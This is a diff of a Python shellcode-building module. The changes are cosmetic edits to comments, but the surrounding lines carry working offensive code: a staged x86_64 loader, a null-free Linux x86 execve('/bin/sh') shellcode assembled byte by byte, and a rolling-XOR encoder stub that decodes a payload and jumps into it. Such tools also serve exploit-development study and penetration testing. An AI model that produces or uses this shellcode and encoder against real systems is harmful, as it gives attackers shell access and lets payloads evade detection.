@@ -448,7 +448,7 @@ def _staged_loader_x86_64(fd: int, map_size: int) -> bytes:
     # pop rsi + re-push to keep addr
     sc += b"\x5E"               # pop rsi (mmap_addr)
     sc += b"\x56"               # push rsi (save again)
-    sc += b"\x4C\x89\xFF"       # mov rdi, fd  -- overwrite from r15 approach
+    sc += b"\x4C\x89\xFF"       # mov rdi, fd : overwrite from r15 approach
     # Simpler: re-encode fd into rdi
     sc += b"\x48\xC7\xC7" + struct.pack("<I", fd & 0xFFFFFFFF)
     # rdx = map_size
@@ -579,15 +579,15 @@ def shellcode_execve_linux_x86(path: bytes = b'/bin/sh') -> bytes:
         raise ValueError(f"path length {path_len} exceeds 1-byte displacement limit (max 127)")
 
     # Back code (18 bytes fixed):
-    #   pop esi          (5E)          -- esi = &path (CALL pushes return addr = &path)
-    #   xor eax, eax     (31 C0)       -- zero eax without null bytes
-    #   mov [esi+N], al  (88 46 NN)   -- write null terminator over placeholder
-    #   push eax         (50)          -- NULL for envp ptr on stack
-    #   push esi         (56)          -- argv[0] = &path
-    #   mov ecx, esp     (89 E1)       -- ecx = argv[]
-    #   mov ebx, esi     (89 F3)       -- ebx = path
-    #   xor edx, edx     (31 D2)       -- edx = envp (NULL)
-    #   mov al, 0x0b     (B0 0B)       -- eax = 11 (execve)
+    #   pop esi          (5E)         : esi = &path (CALL pushes return addr = &path)
+    #   xor eax, eax     (31 C0)      : zero eax without null bytes
+    #   mov [esi+N], al  (88 46 NN)  : write null terminator over placeholder
+    #   push eax         (50)         : NULL for envp ptr on stack
+    #   push esi         (56)         : argv[0] = &path
+    #   mov ecx, esp     (89 E1)      : ecx = argv[]
+    #   mov ebx, esi     (89 F3)      : ebx = path
+    #   xor edx, edx     (31 D2)      : edx = envp (NULL)
+    #   mov al, 0x0b     (B0 0B)      : eax = 11 (execve)
     #   int 0x80         (CD 80)
     back_code = (
         b"\x5e"                           # pop esi
@@ -928,7 +928,7 @@ def encode_xor_rolling(shellcode: bytes,
     #   mov cl, len
     # .loop:
     #   mov al, [rsi + rcx - 1]
-    #   xor al, (key + rcx - 1) & 0xFF   ; approximate -- key changes per byte
+    #   xor al, (key + rcx - 1) & 0xFF   ; approximate: key changes per byte
     #   mov [rsi + rcx - 1], al
     #   loop .loop
     #   jmp rsi
